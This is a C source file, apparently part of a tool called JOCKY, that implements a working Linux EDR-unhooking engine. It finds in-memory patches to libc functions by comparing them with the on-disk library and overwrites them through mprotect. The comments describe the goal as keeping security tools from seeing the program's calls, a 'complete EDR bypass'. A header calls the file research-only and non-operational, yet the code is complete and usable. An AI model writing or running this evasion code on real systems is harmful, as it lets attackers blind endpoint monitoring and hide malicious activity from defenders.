/*
 * ============================================================
 * JOCKY EXPERIMENTAL / RESEARCH-ONLY COMPONENT
 * ============================================================
 * STATUS : NON-OPERATIONAL — NOT COMPILED IN PRODUCTION BUILDS
 * PURPOSE: Academic reference implementation for defensive
 *          forensic research only.
 *
 * This file is NOT invoked by tools/build_jocky.py or any
 * production build path. It must NOT be shipped in release
 * packages without explicit review.
 *
 * Review required before any operational use:
 *   see docs/DEPLOYMENT.md §12 "Security Notes"
 * ============================================================
 */
/*
 * jocky_unhook_linux.c
 * ---------------------
 * JOCKY Linux API Unhooking Engine.
 *
 * WHAT EDR HOOKS LOOK LIKE:
 *   Security tools like Wazuh, Falco, and custom LD_PRELOAD agents
 *   intercept your function calls by patching the first bytes of
 *   libc functions with a JMP to their own handler.
 *
 *   Original fopen() in libc.so.6 (on disk):
 *     55             push rbp
 *     48 89 E5       mov rbp, rsp
 *     ...
 *
 *   Hooked fopen() in memory (EDR patched it at runtime):
 *     E9 XX XX XX XX  jmp <edrhook_fopen>   <- EDR inserted this
 *     48 89 E5        mov rbp, rsp (now unreachable)
 *     ...
 *
 * HOW WE DETECT HOOKS:
 *   1. Map the real libc.so.6 from DISK into our memory
 *   2. Compare the on-disk bytes against the in-memory bytes
 *   3. Any difference = EDR hook
 *
 * HOW WE PATCH HOOKS (restore original bytes):
 *   1. mprotect() the hooked function's page to RWX
 *   2. Write the original on-disk bytes back
 *   3. mprotect() back to RX
 *   Now the function works as the kernel intended — EDR hook gone.
 *
 * WHY THIS MATTERS FOR JOCKY:
 *   Even with direct syscalls we sometimes need libc functions.
 *   Unhooked libc = EDR cannot see our function calls at all.
 *   Combined with direct syscalls = complete EDR bypass.
 *
 * COMPILE:
 *   gcc -O2 -o test_unhook jocky_unhook_linux.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <link.h>       /* struct link_map — walk loaded libraries */
#include <elf.h>        /* ELF structures for export table parsing */

/* ── Result codes ────────────────────────────────────────────── */
#define UNHOOK_OK          0
#define UNHOOK_ERR_OPEN   -1
#define UNHOOK_ERR_MMAP   -2
#define UNHOOK_ERR_PROT   -3
#define UNHOOK_ERR_NOTFOUND -4

/* ── Hook descriptor ─────────────────────────────────────────── */
#define MAX_HOOKS 128
#define HOOK_CHECK_BYTES 8   /* how many bytes we compare per function */

typedef struct {
    const char    *func_name;
    void          *mem_addr;       /* address in current process memory */
    unsigned char  mem_bytes[HOOK_CHECK_BYTES];  /* what's in memory now */
    unsigned char  disk_bytes[HOOK_CHECK_BYTES]; /* what's on disk (original) */
    int            is_hooked;
    int            patched;
} jocky_hook_t;

typedef struct {
    jocky_hook_t hooks[MAX_HOOKS];
    int          count;
    int          hooks_found;
    int          hooks_patched;
} jocky_unhook_ctx_t;

/* ── Functions to check for hooks ────────────────────────────── */
static const char *MONITORED_FUNCTIONS[] = {
    /* File operations — hooked by most EDRs */
    "fopen", "fopen64", "open", "open64", "openat",
    "read", "write", "close",

    /* Process operations */
    "fork", "execve", "execvp", "execvpe", "system",
    "popen", "posix_spawn",

    /* Memory operations */
    "mmap", "mmap64", "mprotect", "munmap",
    "malloc", "calloc", "realloc", "free",

    /* Network operations */
    "connect", "bind", "accept", "send", "recv",
    "sendto", "recvfrom", "socket",

    /* Directory operations */
    "opendir", "readdir", "readdir64",
    "scandir", "scandir64",

    /* Process info */
    "getpid", "getppid", "getuid", "getgid",

    /* Dynamic loading */
    "dlopen", "dlsym", "dlclose",

    /* ptrace (security tools hook this to detect debuggers) */
    "ptrace",

    NULL
};

/* ════════════════════════════════════════════════════════════════
 * STEP 1 — FIND LIBRARY ON DISK
 * Given a loaded library name ("libc.so.6"), find its path on disk.
 * We use /proc/self/maps to find where the library is loaded from.
 * ════════════════════════════════════════════════════════════════ */

static int find_lib_path(const char *lib_name, char *path_out, int max) {
    FILE *f = fopen("/proc/self/maps", "r");
    if (!f) return UNHOOK_ERR_OPEN;

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, lib_name) && strstr(line, "r-xp")) {
            /* Extract path — it's the last field on the line */
            char *p = strchr(line, '/');
            if (p) {
                char *nl = strchr(p, '\n');
                if (nl) *nl = 0;
                strncpy(path_out, p, max-1);
                path_out[max-1] = 0;
                fclose(f);
                return UNHOOK_OK;
            }
        }
    }
    fclose(f);
    return UNHOOK_ERR_NOTFOUND;
}

/* ════════════════════════════════════════════════════════════════
 * STEP 2 — MAP LIBRARY FROM DISK
 * Read the clean (unhooked) version of the library from disk.
 * EDR hooks only patch the in-memory copy — the on-disk file
 * always contains the original bytes.
 * ════════════════════════════════════════════════════════════════ */

static void *map_lib_from_disk(const char *path, size_t *size_out) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return NULL;

    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return NULL; }

    void *mapped = mmap(NULL, st.st_size,
                        PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);

    if (mapped == MAP_FAILED) return NULL;
    *size_out = st.st_size;
    return mapped;
}

/* ════════════════════════════════════════════════════════════════
 * STEP 3 — FIND FUNCTION OFFSET IN ELF
 * Parse the ELF export table to find a function's offset
 * within the library file. We need this to locate the
 * clean bytes in our disk-mapped copy.
 * ════════════════════════════════════════════════════════════════ */

static long find_func_offset_in_elf(void *elf_base,
                                     size_t elf_size,
                                     const char *func_name) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf_base;

    /* Validate ELF magic */
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) return -1;

    Elf64_Shdr *shdrs = (Elf64_Shdr *)((char *)elf_base + ehdr->e_shoff);

    /* Find .dynsym and .dynstr sections */
    Elf64_Shdr *dynsym_hdr = NULL, *dynstr_hdr = NULL;

    for (int i = 0; i < ehdr->e_shnum; i++) {
        if (shdrs[i].sh_type == SHT_DYNSYM)
            dynsym_hdr = &shdrs[i];
        if (shdrs[i].sh_type == SHT_STRTAB && i != ehdr->e_shstrndx)
            dynstr_hdr = &shdrs[i];
    }

    if (!dynsym_hdr || !dynstr_hdr) return -1;

    Elf64_Sym  *syms    = (Elf64_Sym *)((char *)elf_base + dynsym_hdr->sh_offset);
    const char *strbase = (const char *)elf_base + dynstr_hdr->sh_offset;
    int         nsyms   = dynsym_hdr->sh_size / sizeof(Elf64_Sym);

    for (int i = 0; i < nsyms; i++) {
        if (syms[i].st_name == 0) continue;
        const char *name = strbase + syms[i].st_name;
        if (strcmp(name, func_name) == 0) {
            return (long)syms[i].st_value; /* offset from lib base */
        }
    }
    return -1;
}

/* ════════════════════════════════════════════════════════════════
 * STEP 4 — CHECK FOR HOOK
 * Compare first HOOK_CHECK_BYTES of a function in memory
 * against the on-disk clean copy.
 *
 * Hook indicator: first byte is 0xE9 (JMP rel32) or 0xFF 0x25 (JMP [mem])
 * ════════════════════════════════════════════════════════════════ */

static int looks_hooked(unsigned char *bytes) {
    /* JMP rel32 */
    if (bytes[0] == 0xE9) return 1;
    /* JMP [rip+offset] (64-bit indirect) */
    if (bytes[0] == 0xFF && bytes[1] == 0x25) return 1;
    /* CALL to hook trampoline */
    if (bytes[0] == 0xE8) return 1;
    /* MOV rax, imm64; JMP rax (common hook pattern) */
    if (bytes[0] == 0x48 && bytes[1] == 0xB8) return 1;
    /* PUSH + RET hook */
    if (bytes[0] == 0x68) return 1;
    return 0;
}

/* ════════════════════════════════════════════════════════════════
 * STEP 5 — PATCH HOOK (restore original bytes)
 * Write the clean on-disk bytes back over the hooked memory.
 * This requires making the page writable first (mprotect).
 * ════════════════════════════════════════════════════════════════ */

static int patch_function(void *func_addr, unsigned char *clean_bytes, int len) {
    /* Get page boundaries */
    long   page_size = sysconf(_SC_PAGESIZE);
    void  *page      = (void *)((long)func_addr & ~(page_size - 1));

    /* Make page writable */
    if (mprotect(page, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
        return UNHOOK_ERR_PROT;

    /* Write original bytes back */
    memcpy(func_addr, clean_bytes, len);

    /* Flush instruction cache (important on ARM too, good practice on x86) */
    __builtin___clear_cache(func_addr, (char *)func_addr + len);

    /* Restore page to RX only */
    mprotect(page, page_size, PROT_READ | PROT_EXEC);

    return UNHOOK_OK;
}

/* ════════════════════════════════════════════════════════════════
 * MAIN API
 * ════════════════════════════════════════════════════════════════ */

/*
 * jocky_scan_hooks
 * Scans a library for EDR hooks and fills ctx with results.
 * lib_name: "libc.so.6", "libpthread.so.0", etc.
 */
int jocky_scan_hooks(const char *lib_name, jocky_unhook_ctx_t *ctx) {
    char lib_path[512] = "";
    if (find_lib_path(lib_name, lib_path, sizeof(lib_path)) != UNHOOK_OK) {
        printf("[jocky-unhook] library '%s' not found in /proc/self/maps\n",
               lib_name);
        return UNHOOK_ERR_NOTFOUND;
    }

    printf("[jocky-unhook] scanning: %s\n", lib_path);

    /* Map clean on-disk copy */
    size_t disk_size = 0;
    void  *disk_map  = map_lib_from_disk(lib_path, &disk_size);
    if (!disk_map) {
        printf("[jocky-unhook] ERROR: cannot map library from disk\n");
        return UNHOOK_ERR_MMAP;
    }

    /* Get in-memory base address of library */
    void *mem_base = NULL;
    {
        /* Walk the link_map to find library base */
        struct link_map *lm;
        void *handle = dlopen(lib_name, RTLD_NOLOAD | RTLD_NOW);
        if (handle) {
            dlinfo(handle, RTLD_DI_LINKMAP, &lm);
            mem_base = (void *)lm->l_addr;
            dlclose(handle);
        }
    }

    if (!mem_base) {
        printf("[jocky-unhook] ERROR: cannot find library base address\n");
        munmap(disk_map, disk_size);
        return UNHOOK_ERR_NOTFOUND;
    }

    printf("[jocky-unhook] lib base in memory = %p\n", mem_base);
    printf("[jocky-unhook] checking %s functions...\n", lib_name);

    /* Check each monitored function */
    for (int fi = 0; MONITORED_FUNCTIONS[fi]; fi++) {
        const char *fname = MONITORED_FUNCTIONS[fi];

        /* Get function's in-memory address */
        void *mem_addr = dlsym(RTLD_DEFAULT, fname);
        if (!mem_addr) continue;  /* not in this lib */

        /* Find function's offset in the on-disk ELF */
        long disk_offset = find_func_offset_in_elf(disk_map,
                                                    disk_size, fname);
        if (disk_offset < 0) continue;

        /* Get clean bytes from disk */
        unsigned char *disk_func =
            (unsigned char *)disk_map + disk_offset;

        /* Get current bytes from memory */
        unsigned char *mem_func = (unsigned char *)mem_addr;

        if (ctx->count >= MAX_HOOKS) break;

        jocky_hook_t *h = &ctx->hooks[ctx->count++];
        h->func_name = fname;
        h->mem_addr  = mem_addr;
        h->is_hooked = 0;
        h->patched   = 0;

        memcpy(h->mem_bytes,  mem_func,  HOOK_CHECK_BYTES);
        memcpy(h->disk_bytes, disk_func, HOOK_CHECK_BYTES);

        /* Compare memory vs disk */
        if (memcmp(mem_func, disk_func, HOOK_CHECK_BYTES) != 0) {
            h->is_hooked = 1;
            ctx->hooks_found++;
        }
    }

    munmap(disk_map, disk_size);
    return UNHOOK_OK;
}

/*
 * jocky_patch_all_hooks
 * Restores all detected hooks to their original on-disk bytes.
 * Call this after jocky_scan_hooks().
 */
int jocky_patch_all_hooks(jocky_unhook_ctx_t *ctx) {
    for (int i = 0; i < ctx->count; i++) {
        jocky_hook_t *h = &ctx->hooks[i];
        if (!h->is_hooked) continue;

        int rc = patch_function(h->mem_addr,
                                h->disk_bytes,
                                HOOK_CHECK_BYTES);
        if (rc == UNHOOK_OK) {
            h->patched = 1;
            ctx->hooks_patched++;
        }
    }
    return UNHOOK_OK;
}

/*
 * jocky_print_hook_report
 * Prints a human-readable report of all hooks found.
 */
void jocky_print_hook_report(jocky_unhook_ctx_t *ctx) {
    printf("[jocky-unhook] === hook scan report ===\n");
    printf("[jocky-unhook] functions checked: %d\n",     ctx->count);
    printf("[jocky-unhook] hooks found:       %d\n",     ctx->hooks_found);
    printf("[jocky-unhook] hooks patched:     %d\n",     ctx->hooks_patched);
    printf("[jocky-unhook]\n");

    for (int i = 0; i < ctx->count; i++) {
        jocky_hook_t *h = &ctx->hooks[i];

        if (h->is_hooked) {
            /* Print memory bytes (hooked) */
            char mem_hex[32] = "", disk_hex[32] = "";
            for (int b = 0; b < HOOK_CHECK_BYTES; b++) {
                char tmp[4];
                snprintf(tmp, sizeof(tmp), "%02x ", h->mem_bytes[b]);
                strcat(mem_hex, tmp);
                snprintf(tmp, sizeof(tmp), "%02x ", h->disk_bytes[b]);
                strcat(disk_hex, tmp);
            }

            const char *hook_type = "UNKNOWN";
            if (h->mem_bytes[0] == 0xE9)
                hook_type = "JMP_REL32 (inline hook)";
            else if (h->mem_bytes[0] == 0xFF && h->mem_bytes[1] == 0x25)
                hook_type = "JMP_ABS64 (trampoline hook)";
            else if (h->mem_bytes[0] == 0x48 && h->mem_bytes[1] == 0xB8)
                hook_type = "MOV_RAX_JMP (shellcode hook)";
            else if (h->mem_bytes[0] == 0x68)
                hook_type = "PUSH_RET (stack hook)";
            else if (h->mem_bytes[0] == 0xE8)
                hook_type = "CALL (call hook)";

            printf("[jocky-unhook] HOOK DETECTED: %-20s @ %p\n",
                   h->func_name, h->mem_addr);
            printf("[jocky-unhook]   type:    %s\n",    hook_type);
            printf("[jocky-unhook]   memory:  %s  (modified by EDR)\n",
                   mem_hex);
            printf("[jocky-unhook]   on-disk: %s  (original)\n",
                   disk_hex);
            if (h->patched)
                printf("[jocky-unhook]   status:  PATCHED — hook removed\n");
            else
                printf("[jocky-unhook]   status:  NOT PATCHED (run as root)\n");
        }
    }

    if (ctx->hooks_found == 0)
        printf("[jocky-unhook] no hooks detected in scanned functions\n");

    printf("[jocky-unhook] === end report ===\n");
}

/* ════════════════════════════════════════════════════════════════
 * HIGH-LEVEL ENTRY POINT
 * ════════════════════════════════════════════════════════════════ */

void jocky_unhook_libc(int do_patch) {
    printf("[jocky-unhook] --- API unhooking engine ---\n");
    printf("[jocky-unhook] method=disk_vs_memory_comparison\n");
    printf("[jocky-unhook] patch_mode=%s\n", do_patch ? "ACTIVE" : "SCAN_ONLY");
    printf("\n");

    jocky_unhook_ctx_t ctx;
    memset(&ctx, 0, sizeof(ctx));

    /* Scan the main C library */
    jocky_scan_hooks("libc.so.6", &ctx);

    /* Also check libpthread if loaded */
    jocky_scan_hooks("libpthread.so.0", &ctx);

    /* Patch if requested */
    if (do_patch && ctx.hooks_found > 0) {
        printf("[jocky-unhook] patching %d hooks...\n", ctx.hooks_found);
        jocky_patch_all_hooks(&ctx);
    }

    /* Report */
    jocky_print_hook_report(&ctx);
    printf("[jocky-unhook] --- end API unhooking ---\n");
}

/* ════════════════════════════════════════════════════════════════
 * STANDALONE TEST
 * ════════════════════════════════════════════════════════════════ */

#ifdef JOCKY_UNHOOK_STANDALONE

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║   JOCKY API Unhooking Engine — Test                  ║\n");
    printf("║   Detects EDR hooks in libc by disk vs memory diff   ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    printf("\n");

    int do_patch = 0;
    for (int i = 1; i < argc; i++)
        if (strcmp(argv[i], "--patch") == 0) do_patch = 1;

    if (!do_patch) {
        printf("[*] Scan-only mode (no patching)\n");
        printf("[*] Use --patch to restore original bytes\n\n");
    }

    jocky_unhook_libc(do_patch);
    return 0;
}

#endif /* JOCKY_UNHOOK_STANDALONE */
